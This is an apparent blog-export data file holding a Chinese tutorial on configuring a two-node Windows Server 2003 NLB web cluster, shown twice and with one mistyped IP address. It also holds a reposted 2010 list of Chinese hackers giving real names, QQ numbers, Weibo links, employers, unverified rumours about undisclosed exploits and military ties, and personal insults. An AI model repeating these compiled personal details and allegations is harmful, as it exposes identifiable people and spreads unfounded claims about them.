尽管NLB群集是一种非常简洁的工具，但安装配置NLB群集必须满足很严格的要求，譬如首先要保证群集中服务器必须能够正常的单独运行。以安装 配置两节点的NLB群集为例，这些条件简述如下：</p> <p>　　(1)每个节点服务器必须拥有一个静态IP地址，另外还应该为NLB群集准备一个静态IP地址。</p> <p>　　(2)NLB群集需要拥有一个DNS名称，且该DNS记录项应该与区群集IP地址建立了映射关系。</p> <p>　　(3)每个节点服务器上应该安装完全相同的服务器软件(如IIS、终端服务器等网络服务)，以构成一个两节点的NLB群集。</p> <p>　　在接下来的内容中将介绍如何安装配置一个较为简单的NLB群集—拥有两个节点的Web服务器群集。所要安装配置的服务器群集环境为：两台运行  Windows Server 2003 Enterprise  Edition的服务器，可以将其称为节点1和节点2。由于所有的NLB群集成员必须使用属于相同子网的静态IP地址，因此准备为节点1分配的静态IP地  址为“10.115.223.1”，准备为节点2分配的静态IP地址为“10.1115.223.2”，为NLB群集分配的IP地址是  10.115.223.10。对NLB和配置环境了解之后，现在就可以进行详细的操作了。</p> <p>　　NLB群集中的每一个节点拥有一个静态IP地址是安装配置NLB群集的首要且必要条件。我们首先为节点1进行配置。</p> <p>　　在节点1服务器的桌面上右击“网上邻居”，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　在“本地连接 属性”对话框中双击“Internet 协议(TCP&#x2F;IP)”选项，打开“Internet 协议(TCP&#x2F;IP)  属性”对话框。在常规选项卡中点选“使用下面的IP地址”单选框，并指定静态IP地址。本例使用IP地址为“10.115.223.1”，子网掩码为  “255.255.254.0”，默认网关为“10.115.223.254”，DNS服务器地址为“10.115.223.1”(如图1)。</p> <p>　　</p> <p><img width=\"404\" height=\"443\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204258559.jpg\" /></p> <p>　　图1</p> <p>　　在Windows Server 2003中安装部署Web服务需要IIS 6.0的支持，但是在默认情况下IIS  6.0组件并没有被安装，因此手动安装IIS 6.0组件。</p> <p>　　在“控制面板”中双击“添加或删除程序”图标，在打开的“添加或删除程序”对话框中单击“添加&#x2F;删除Windows组件”按钮，打开 “Windows组件向导”对话框。</p> <p>　　在“组件”列表中找到并双击“应用程序服务器”复选框，在打开的“应用程序服务器”对话框中双击“Internet信息服务(IIS)”选项，   打开“Internet信息服务(IIS)”对话框。在子组件列表中找到并勾选“万维网服务”复选框，依次单击“确定&#x2F;确定&#x2F;下一步”按钮开始安装。最后  单击“完成”按钮结束安装过程(如图2)。</p> <p>　　</p> <p><img width=\"449\" height=\"345\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204301391.jpg\" /></p> <p>　　图2</p> <p>　　用同样的方法为节点2安装Web服务器组件。</p> <br /> <p><strong>三、创建群集主机记录</strong></p> <p>　　在安装NLB群集之前建议先把DNS准备好，在本例中节点1同时也是网络中的DNS服务器。可以在节点1上为群集指派一个DNS名称，依次单击 “开始&#x2F;所有程序&#x2F;管理工具&#x2F;DNS”，打开“dnsmagt”窗口。</p> <p>　　在左窗格中依次展开“ServerName&#x2F;正向查找区域”目录。然后右击域名“cpcw.com”区域，执行“新建主机”快捷命令(如图 3)。</p> <p>　　</p> <p><img width=\"550\" height=\"371\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204302983.jpg\" /></p> <p>　　图3</p> <p>　　在打开“新建主机”对话框  “名称”编辑框中键入一个自定义的群集名称(本例键入“Cluster”);在“IP地址”编辑框中键入准备该群集指派的静态IP地址(本例为  “10.115.223.10”)。单击“添加主机”按钮，很快就会提示已经成功创建了主机记录(如图4)。</p> <p>　　</p> <p><img width=\"347\" height=\"300\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204304650.jpg\" /></p> <p>　　图4</p> <p><strong>四、在节点1上安装配置NLB</strong></p> <p>　　完成各项准备准备工作以后，就可以安装配置NLB群集了。对于两个节点而言，先在哪一个节点上安装配置NLB群集都是可以的。下面我们将在节点 1上进行安装配置。</p> <p>　　在节点1的桌面上右击“网上邻居”图标，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　观察“此连接使用下列项目”列表可以发现，默认情况下并没有选中“网络负载平衡”复选框。勾选该复选框(如图5)，然后单击“属性”按钮，打开  “网络负载平衡  属性”对话框。在“群集IP地址”区域，设置NLB群集IP地址为“10.115.223.10”，该地址供群</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>[转]构建网络负载平衡(NLB)</strong>                                                         作者：佚名&amp;#160;&amp;#160;&amp;#160;&amp;#160;厚朴教育来源：<a href=\"http://ce.sysu.edu.cn/hope/ShowCopyFrom.asp?ChannelID=1007&amp;SourceName=%E4%BD%9A%E5%90%8D\">佚 名</a>&amp;#160;&amp;#160;&amp;#160;                                        　　NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接 请求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点            <p>　　当把一台服务器(包括Web服务器、FTP服务器或者流媒体服务器等等)放入网络中之后，随着客户端数量的不断增  加，人们往往需要功能更强大、处理速度更快的服务器。为了解决这个问题，如果将原有的服务器替换成功能更强大、处理速度更快的服务器显然并不是值得称道的  办法。但是如果能把新服务器添加到原有服务器的处理能力基础上而不是替换它，这种方案毫无疑问更容易被用户接受。网络负载平衡(Network  Load Balancing，NLB)群集的出现正好实现了这一目的。</p> <p>　　NLB群集最早出现在Windows 2000 Server的Advanced Server系统中，在Windows Server  2003的各个版本中均提供了此项功能。NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接请  求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点。</p> <p>　　在NLB群集中，每台服务器都会有一个属于自己的静态IP地址，但NLB群集中的所有服务器还有一个共同的IP地址—NLB群集地址。客户端可   以通过这个IP地址连接到NLB群集，就像连接到其它IP地址一样。当有客户端请求连接到这个共享的IP地址时，NLB群集会将每个访问请求指派一个具体  的群集成员。</p> <p>　　尽管NLB群集是一种非常简洁的工具，但安装配置NLB群集必须满足很严格的要求，譬如首先要保证群集中服务器必须能够正常的单独运行。以安装 配置两节点的NLB群集为例，这些条件简述如下：</p> <p>　　(1)每个节点服务器必须拥有一个静态IP地址，另外还应该为NLB群集准备一个静态IP地址。</p> <p>　　(2)NLB群集需要拥有一个DNS名称，且该DNS记录项应该与区群集IP地址建立了映射关系。</p> <p>　　(3)每个节点服务器上应该安装完全相同的服务器软件(如IIS、终端服务器等网络服务)，以构成一个两节点的NLB群集。</p> <p>　　在接下来的内容中将介绍如何安装配置一个较为简单的NLB群集—拥有两个节点的Web服务器群集。所要安装配置的服务器群集环境为：两台运行  Windows Server 2003 Enterprise  Edition的服务器，可以将其称为节点1和节点2。由于所有的NLB群集成员必须使用属于相同子网的静态IP地址，因此准备为节点1分配的静态IP地  址为“10.115.223.1”，准备为节点2分配的静态IP地址为“10.1115.223.2”，为NLB群集分配的IP地址是  10.115.223.10。对NLB和配置环境了解之后，现在就可以进行详细的操作了。</p> <p>　　NLB群集中的每一个节点拥有一个静态IP地址是安装配置NLB群集的首要且必要条件。我们首先为节点1进行配置。</p> <p>　　在节点1服务器的桌面上右击“网上邻居”，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　在“本地连接 属性”对话框中双击“Internet 协议(TCP&#x2F;IP)”选项，打开“Internet 协议(TCP&#x2F;IP)  属性”对话框。在常规选项卡中点选“使用下面的IP地址”单选框，并指定静态IP地址。本例使用IP地址为“10.115.223.1”，子网掩码为  “255.255.254.0”，默认网关为“10.115.223.254”，DNS服务器地址为“10.115.223.1”(如图1)。</p> <p>　　</p> <p><img width=\"404\" height=\"443\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204258559.jpg\" /></p> <p>　　图1</p> <p>　　在Windows Server 2003中安装部署Web服务需要IIS 6.0的支持，但是在默认情况下IIS  6.0组件并没有被安装，因此手动安装IIS 6.0组件。</p> <p>　　在“控制面板”中双击“添加或删除程序”图标，在打开的“添加或删除程序”对话框中单击“添加&#x2F;删除Windows组件”按钮，打开 “Windows组件向导”对话框。</p> <p>　　在“组件”列表中找到并双击“应用程序服务器”复选框，在打开的“应用程序服务器”对话框中双击“Internet信息服务(IIS)”选项，   打开“Internet信息服务(IIS)”对话框。在子组件列表中找到并勾选“万维网服务”复选框，依次单击“确定&#x2F;确定&#x2F;下一步”按钮开始安装。最后  单击“完成”按钮结束安装过程(如图2)。</p> <p>　　</p> <p><img width=\"449\" height=\"345\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204301391.jpg\" /></p> <p>　　图2</p> <p>　　用同样的方法为节点2安装Web服务器组件。</p> <br /> <p><strong>三、创建群集主机记录</strong></p> <p>　　在安装NLB群集之前建议先把DNS准备好，在本例中节点1同时也是网络中的DNS服务器。可以在节点1上为群集指派一个DNS名称，依次单击 “开始&#x2F;所有程序&#x2F;管理工具&#x2F;DNS”，打开“dnsmagt”窗口。</p> <p>　　在左窗格中依次展开“ServerName&#x2F;正向查找区域”目录。然后右击域名“cpcw.com”区域，执行“新建主机”快捷命令(如图 3)。</p> <p>　　</p> <p><img width=\"550\" height=\"371\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204302983.jpg\" /></p> <p>　　图3</p> <p>　　在打开“新建主机”对话框  “名称”编辑框中键入一个自定义的群集名称(本例键入“Cluster”);在“IP地址”编辑框中键入准备该群集指派的静态IP地址(本例为  “10.115.223.10”)。单击“添加主机”按钮，很快就会提示已经成功创建了主机记录(如图4)。</p> <p>　　</p> <p><img width=\"347\" height=\"300\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204304650.jpg\" /></p> <p>　　图4</p> <p><strong>四、在节点1上安装配置NLB</strong></p> <p>　　完成各项准备准备工作以后，就可以安装配置NLB群集了。对于两个节点而言，先在哪一个节点上安装配置NLB群集都是可以的。下面我们将在节点 1上进行安装配置。</p> <p>　　在节点1的桌面上右击“网上邻居”图标，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　观察“此连接使用下列项目”列表可以发现，默认情况下并没有选中“网络负载平衡”复选框。勾选该复选框(如图5)，然后单击“属性”按钮，打开  “网络负载平衡  属性”对话框。在“群集IP地址”区域，设置NLB群集IP地址为“10.115.223.10”，该地址供群</p>\n"},{"title":"2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解","date":"2010-10-10T12:41:00.000Z","_content":"2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解文章作者：<br />信息来源：邪恶八进制信息安全团队(<a target=\"_blank\" href=\"http://www.eviloctal.com/\" rel=\"noopener noreferrer\">www.eviloctal.com</a>)<br />百晓生_民间杂志【民间交流 民间技术 民间文化 民间舆论】<br />我只是在写自己所想到的杂志 我只是菜鸟！<br /><br />主页博客相册|个人档案 |好友 <br />查看文章&#160; &#160; <br /><br />【转帖】2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br />2010年10月06日 星期三 下午 08:06<br />强大的黑客，强大的资料，以后就跟着这榜单混了，呵呵！<br /><br />郑重声明：<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />小心是网络捧杀，中国黑客威胁论，最近是多事之秋。<br /><br />！！！！！！！！！！！！！！！！！！！！！！<br /><br />——————————————————————————————————————————<br /><br />祝各位大牛国庆节快乐.<br /><br />本文足以轰动一下.各大网站编辑抓紧第一时间发布<br /><br />2010新编中国顶级黑客圈内人物资料和QQ,微博以及博客详解<br /><br />首先最主要注明的是：排名不分先后<br /><br />本名单第一部分罗列的黑客都是真正拥有技术和才能者。并非大多数人平时在电视中所看到的那些盗号或入侵网站的“黑客”，电视里报道的那些人只是黑客界最底 层的人。例如熊猫烧香的作者，其实技术并不高，在黑客圈中大多数人都只是把这个病毒当作一个玩具。而技术含量高超的病毒都是类似于29A发布的那种。<br /><br />本文作者自我介绍。毕业于哈尔滨工业大学，2001年出道黑客圈，曾在国内多个黑客论坛潜水多年。参加过2004年国内顶级黑客大会XCON（安全焦点峰 会）（PS:扯淡）。2003年就职过国际顶级搜索引擎公司GOOGLE，后因个人原因离职。在黑客界有一定人缘基础。所以本文有一定权威性。至于我是 谁，避免被人追杀还是不明说了。下面开始正文：<br />第一部分列举老牌黑客。中国黑客界早期技术很牛的人。都是真正的高手。现在大部分技术还是不减当年，数一数二，是普通人望尘莫及的。<br /><br />在下面这些人中很多人手握众多危害极大的未公开漏洞。就是圈内所称的0day。这类危害极大的0day一般在黑市上可以卖的数十万人民币。<br />本文原始发布地址: <a target=\"_blank\" href=\"https://docs.google.com/leaf?id=1rO9CxzojOO0Qho-VOIUpGjwfZhAqcuRWnVXAbluCk4I&amp;sort=name&amp;layout=list&amp;num=50\" rel=\"noopener noreferrer\">https://docs.google.com/leaf?id= ... out=list&amp;num=50</a><br />一切内容以上面博客原文为准<br />注：以下列举的黑客当然只是一部分，其实还有很多的前辈级黑客。只不过现在基本都告别技术行业了。下面的人物中大部分还在相关领域活动，所以优先列出了。<br /><br />sunwear<br />QQ:47347<br />微博: <a target=\"_blank\" href=\"http://t.qq.com/sunwe4r\" rel=\"noopener noreferrer\">http://t.qq.com/sunwe4r</a><br />博客: 好像不用了<br />日娃哥。EST核心成员。圈内皆知他手握很多未公开漏洞。渗透入侵和漏洞方面的高手，曾是编程内核牛人。曾经入侵过世界顶级黑客组织Metasploit，剑桥大学等众多高端机构。几年前的世界最顶级两大黑客大会defcon和blackhat都对他有过报道。<br /><br />刺 QQ:32750912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/aullik5\" rel=\"noopener noreferrer\">http://t.qq.com/aullik5</a><br />博客:<br />刺哥，大风哥。身材瘦弱。是中国黑客圈内纯技术黑客组织幻影旅团创始人。中国顶级黑客之一。目前好像就职于淘宝公司网络安全部门。也是手握很多未公开漏洞 的人。很多影响力很大的0day都是出自幻影旅团。WebZine的发起人。并且发展过WIKI的系统。还曾远赴美国参加世界顶级黑客大会 blackhat。。<br /><br />dm<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/zoeluk\" rel=\"noopener noreferrer\">http://t.qq.com/zoeluk</a><br />博客:<br />国内顶级地下黑客组织0x557核心成员。是漏洞挖掘，利用方面的高手。不用说，手里的漏洞也是多的可以批发了。目前就职于世界著名反病毒杀毒软件公司麦咖啡(刚刚被intel收购)。现在还写起了iphone,ipad下的安全软件。看来是个全能选手。<br /><br />flashsky<br />QQ:38062 &amp; 16202253<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/flash-sky\" rel=\"noopener noreferrer\">http://t.qq.com/flash-sky</a><br />方兴。闪空哥。国内著名黑客组织安全焦点核心成员。2003年WINDOWS历史上最严重安全漏洞细节全球首发者,数百个高危级安全漏洞发现者,历任启明 星辰,美国EEYE,美国微软特聘安全专家,美国微软BLUEHAT第一个中国演讲者,安全焦点成员,南京翰海源信息技术有限公司创始人和CEO。对漏洞 方面的研究是相当高深的。预祝公司发展顺利。<br /><br />tombkeeper<br />QQ:644909<br />博客:<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tombkeeper\" rel=\"noopener noreferrer\">http://t.qq.com/tombkeeper</a><br />于某。传说中的tk教主。国内著名黑客组织安全焦点核心成员。就职于绿盟科技，俗称妇科圣手。对windows操作系统以及漏洞等方面的研究可以说是非常精通。而在安全焦点论坛，最近几年一直被人奉为TK教主。对于其他领域的科学也有着独到的见解。文笔思想也是很独特的。<br /><br />glacier<br />QQ:1973435<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/glacier\" rel=\"noopener noreferrer\">http://t.qq.com/glacier</a><br />黄鑫。冰河哥。黄总。同为国内著名的黑客组织安全焦点核心成员。深圳大成天下的创始人之一。是中国最早的远程控制木马&quot;冰河&quot;的作者，也是著名安全扫描工 具&quot;x-scan&quot;的作者。黑客编程方面的高手，对于网络协议，加密安全以及软件工程有很深的了解。女黑客wollf的老公。一个风趣幽默的人。从微博上 就可以看出来了。已经当父亲了，当然孩子不是木马，是一个帅哥。再此祝福一下。<br /><br />swan<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/Swan557\" rel=\"noopener noreferrer\">http://t.qq.com/Swan557</a><br />0x557(SST)核心成员，对于linux,windows操作系统上的漏洞可谓了如指掌。<br /><br />goodwell<br />QQ:19558287<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/goodwell\" rel=\"noopener noreferrer\">http://t.qq.com/goodwell</a><br />龚蔚。安致信息技术有限公司。中国早起黑客组织绿色兵团创始人，是传说中的中国黑客教父。曾经接受过中央电视台的参访。是以为资深的魔兽世界玩家。<br /><br />xundi<br />QQ:518860<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/idnuxzhang\" rel=\"noopener noreferrer\">http://t.qq.com/idnuxzhang</a><br />张迅迪。国内早期的著名黑客组织安全焦点创始人。具体就不过多介绍了，因为不熟悉，哈哈。<br /><br />lion<br />QQ:21509<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/coollion\" rel=\"noopener noreferrer\">http://t.qq.com/coollion</a><br />林勇。中国红客联盟创始人。跟大多网民在网上所了解到的中国红客大联盟不同。这个才是真正的中国红客联盟。至于所谓的sharpwinner，我只能用一句文明用语敏感词来形容“SB”“草泥马”。现在对于技术不如当年，而且已经远离技术告别当初了。<br /><br />isno<br />QQ:1070681<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/isnoblah\" rel=\"noopener noreferrer\">http://t.qq.com/isnoblah</a><br />安全焦点核心成员之一。目前就职于北京中航嘉信公司。曾经写过很多漏洞溢出方面的分析利用文章（WEBDAV,IDQ,IDA等）。exploit也写过很多。现在较为低调。<br /><br />天行<br />QQ:911189<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/tian_xing\n\" rel=\"noopener noreferrer\">http://t.qq.com/tian_xing</a> 好像不怎么用<br />中国第一代黑客之一。在1999年曾经与发动对国外网站的攻击。网络刺客,网络卫兵是其代表作品。而他对溢出和漏洞利用也颇有研究，例如RPC漏洞利用程序。以及他写的后门都很好。<br /><br />quack<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wulujia\" rel=\"noopener noreferrer\">http://t.qq.com/wulujia</a><br />吴鲁佳。深圳达成天下创始人。与中国木马之父黄鑫关系很好。安全焦点早期活跃之人，ID：quack。<br /><br />icbm<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/icbmx2\" rel=\"noopener noreferrer\">http://t.qq.com/icbmx2</a> 基本不用<br />赵伟。知道创宇创始人之一。曾经就职于国内著名信息安全公司启明星辰积极防御实验室。对各操作系统以及第三方软件的漏洞有很深的了解，手下的未公开漏洞很多。包括基于web方面的一些独特漏洞。<br /><br />sowhat<br />QQ:不详<br /><a target=\"_blank\" href=\"http://t.qq.com/secsecsec\" rel=\"noopener noreferrer\">http://t.qq.com/secsecsec</a><br />薛峰。就职于某保密单位。曾赴美国参加过国际顶级黑客大会blackhat。手握很多未公开漏洞。好像今年中国顶级黑客盛会xcon上还抽奖中了一台PS3。<br /><br />vxk<br />QQ:86879759<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/cvcvxk\" rel=\"noopener noreferrer\">http://t.qq.com/cvcvxk</a><br />几年前活跃于国内著名病毒论坛CVC。是国内知名的病毒专家。对操作系统内核以及编程，逆向，破解非常精通。可谓程序全能专家。<br /><br />refdom<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/refdom\" rel=\"noopener noreferrer\">http://t.qq.com/refdom</a><br />安全焦点核心成员之一。曾经是中国红客联盟的一员。<br /><br />watercloud<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/watercloud\" rel=\"noopener noreferrer\">http://t.qq.com/watercloud</a><br />知道创宇公司创始人之一。与icbm关系甚好。安全焦点核心成员之一。对漏洞，加密解密等方面有者多年的研究经验，网络安全趋势与发展有着独到的见解。最主要的还是对漏洞，0day方面，手握0day数量也很客观。<br /><br />alert7<br />QQ:415451<br />博客:<br />安全焦点核心成员之一。曾经就职与著名杀毒软件MCAFEE。目前就职于南京翰海源(Flashsky的公司)。对linux 方面的研究经验长达10年以上。对于linux等开源系统漏洞溢出分析利用了如指掌。<br /><br />袁哥<br />博客:<br />传说中的袁哥。没错，中国所有圈内顶级黑客无不佩服的人。就只与绿盟科技。袁哥在数学，编程，漏洞等诸多方面的造诣是无人可以比拟的。很多漏洞要早其它人数年之久就已经发现并且完美利用了。堪称漏洞方面的其人。黑客界的顶级高手。<br /><br />sunx<br />QQ:239670<br />孙华。国内非常著名的黑客编程高手，对漏洞溢出与利用和有研究，写过EXPLOIT。例如IDA漏洞和printer。在9X年代用汇编写过病毒。并且还编写过操作系统后门程序。<br /><br />funnywei<br />QQ:25044885<br />魏强。F博士。安全焦点核心成员之一。漏洞挖掘，漏洞利用方面的高手，在历届国内顶级黑客盛会XCON上都能见到他的身影。据传就职于中国人民解放军XXX部。为中国人民解放军提供很多未公开漏洞。<br /><br />小榕<br />中国早期著名黑客软件“流光”“逆雪”“乱刀”“黑客字典生成器”“ARPSNIFFER”“命令行注入工具”等黑客软件作者。目前对于漏洞方面等技术不如以上几人。不过对于中国黑客界的贡献还是不可小觑的。<br /><br />xikug<br />QQ:53564797<br />国内著名内核，漏洞，程序研究站debugman的站长。逆向，破解，加密，解密，内核等方面的高人。<br /><br />baoz<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/perlish\" rel=\"noopener noreferrer\">http://t.qq.com/perlish</a><br />方勇。包子。fatb。多年前就活跃于中国黑客界。活跃程度和人缘还是不错的。目前就职与迅雷公司。有大牛曾说是个带眼镜的胖子。为人厚道，皮肤较黑。<br /><br />wzt<br />QQ:71579912<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/wztjlh\" rel=\"noopener noreferrer\">http://t.qq.com/wztjlh</a><br />曾经的中国红客联盟核心成员。对于linux内核，以及linux漏洞方面颇有研究。<br /><br />czy<br />QQ:484323<br />四川的一个著名黑客，比较低调，但地下交流圈子中交流频繁。手握很多0day的高手。<br /><br />zzzevazzz<br />QQ:49322630<br />博客:<a target=\"_blank\" href=\"http://zzzevazzz.bokee.com/\" rel=\"noopener noreferrer\">http://zzzevazzz.bokee.com/</a><br />国内著名黑客组织幻影旅团核心成员。早期混迹于灰色轨迹。曾经著名的do all in cmdshell  作者。曾经在安全焦点普及ntsd知识，红极一时。对于windows内核以及漏洞方面有着深入的了解和经验。曾经写过很多有利于大众的文章，分享过很多 宝贵的经验。<br /><br />vessial<br />QQ:不详<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/vessial\" rel=\"noopener noreferrer\">http://t.qq.com/vessial</a><br />同dm一样就职于国际顶级杀毒软件安全厂商麦咖啡公司。也是一位对于漏洞等方面有诸多经验的高手。<br /><br />bkbll<br />qq:78384349<br />dumplogon。BK哥。中国红客联盟核心成员之一。2001年中美黑客大战时期技术还是初级的，但也算早期了。后来对溢出，漏洞以及逆向分析方面颇有研究，技术不错。是lion的好朋友。<br /><br />killer<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/dongzhiqiang\" rel=\"noopener noreferrer\">http://t.qq.com/dongzhiqiang</a><br />博客:<br />董志强。安全焦点核心成员之一。曾经就只与启明星辰公司。对于病毒与防病毒，逆向工程与破解等方面有多年的研究经验。目前为著名安全产品超级巡警的BOSS。<br /><br />coolq<br />qq:49462335<br />就职于绿盟科技的linux方面高手。在绿盟期刊上曾发有著作。对于开源系统有着多年的应用开发经验。linux,unix,bsd内核方面以及漏洞挖掘，利用方面也有着多年的经验。<br /><br />pjf<br />qq:85863144<br />博客:<a target=\"_blank\" href=\"http://pjf.blogcn.com/\" rel=\"noopener noreferrer\">http://pjf.blogcn.com/</a><br />国内著名antirootkit工具icesword的作者。是内核方面的专家。国内著名安全软件公司奇虎360公司的核心开发人员。<br /><br />lcx<br />海洋顶端网站长，是国内渗透入侵方面的高手，有着多年的入侵经验。是中国网马教父之一。安全手册的顾问。<br /><br />村长<br />QQ:6021240<br />国内顶级黑客组织0x557(SST)创始人。是国内著名信息安全公司启明星辰积极防御实验室的BOSS。对windows,linux非常了解，拥有多年的漏洞挖掘，利用的经验。<br /><br />casper<br />QQ:843525<br />华永兴安BOSS。国内顶级黑客大会xcon的主办方，也是安全焦点创始人之一。中国黑客界的老前辈。目前已经脱离技术领域，向老板发展了。<br /><br />e4gle<br />QQ:1949479<br />国内著名黑客组织WSS核心成员。老一代的黑客。对linux,unix下的溢出漏洞分析以及利用有着多年的研究经验，并且对病毒也很了解。<br />--------------------华丽的分割线----------------------<br /><br />下面将列举一些新生力量，虽然是新生，但起码都是3-6年前左右就开始活跃的人，所以还算是中生代黑客。<br /><br />mj0011<br />QQ:保密，避免骂他的人太多。<br />博客:<br />就职于国内著名安全公司奇虎360。为核心工程师。圈内敌人无数，只因口无遮拦，相貌丑陋等缺点所导致。对瑞星，金山等公司曾经常出言讽刺，另外连国际顶 级安全厂商赛门铁克也不放过。可谓毒舌娘子，连我也被骂过好几次。话说回来，对于编程，内核，木马，远控方面的技术还是不可否定的。<br /><br />baiyuanfan<br />QQ:51449276<br />曾经著名的后门程序BYSHELL的作者。曾经在某界安全焦点峰会上有过演讲议题，技术还是不错的。<br /><br />zwell<br />QQ:27592430<br />网站:<a target=\"_blank\" href=\"http:/\n/www.nosec.org/\" rel=\"noopener noreferrer\">http://www.nosec.org</a><br />白远方。曾经NB联盟核心成员。现在为诺塞科技的老大。诺塞科技的产品现在也广为圈内所知，例如穿山甲，JSKY等工具。对编程和注入WEB方面的东西也是很精通的。<br /><br />sudami<br />qq:527463097<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/sudami\" rel=\"noopener noreferrer\">http://t.qq.com/sudami</a><br />博客:<br />目前就职于国内著名杀毒软件安全软件厂商奇虎360公司。是后起的windows编程，内核之秀。对渗透攻击，入侵方面技术基本为零。曾在邪恶八进制，DEBUGMAN等论坛发表过多篇原创文章。对技术很有追求，进步很快的一个牛人。<br /><br />oldjun<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/seuhacker\" rel=\"noopener noreferrer\">http://t.qq.com/seuhacker</a><br />博客:<a target=\"_blank\" href=\"http://www.oldjun.com/\" rel=\"noopener noreferrer\">http://www.oldjun.com/</a><br />QQ:34680304<br />t00ls核心成员。asp,php等WEB脚本方面的高手，对于渗透入侵，WEB渗透相当精通。<br /><br />9xiao<br />博客: &amp; <a target=\"_blank\" href=\"http://www.9xiao.net/\" rel=\"noopener noreferrer\">www.9xiao.net</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/deioncube\" rel=\"noopener noreferrer\">http://t.qq.com/deioncube</a><br />t00ls核心成员，原火狐联盟的人。<br /><br />aono<br />QQ:13335589<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/air-storm\" rel=\"noopener noreferrer\">http://t.qq.com/air-storm</a><br />t00ls核心成员。无线安全方面的高手。在无线网络安方面有其独特的技术思想和经验。<br /><br />云舒<br />QQ:21287305<br />微博:<a target=\"_blank\" href=\"http://t.qq.com/yunshuy\" rel=\"noopener noreferrer\">http://t.qq.com/yunshuy</a><br />是幻影旅团的核心成员之一，目前同axis一同就职于淘宝公司。其实也算的上是一位比较有资历的老人了。应该位列在上面。写过synflood方面代码。<br /><br />明小子<br />QQ:830540<br />网站:<a target=\"_blank\" href=\"http://www.hackdiy.com/\" rel=\"noopener noreferrer\">http://www.hackdiy.com/</a><br />黑客动画吧的人。著名的明小子旁注工具domain的作者。相比很多菜鸟都以及享受过这个工具的实惠了。其实技术只能说是一般。不过入行也不久了。注入脚本以及简易的编程还是不错的。<br /><br />鬼仔<br />QQ:359421<br />博客:<a target=\"_blank\" href=\"http://huaidan.org/\" rel=\"noopener noreferrer\">http://huaidan.org</a><br />目前就职于新浪公司。WEB应用安全方面的高手。<br /><br />lake2<br />QQ:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br />微博:<a target=\"_blank\" href=\"http://t.qq.com/mrhupo\" rel=\"noopener noreferrer\">http://t.qq.com/mrhupo</a><br 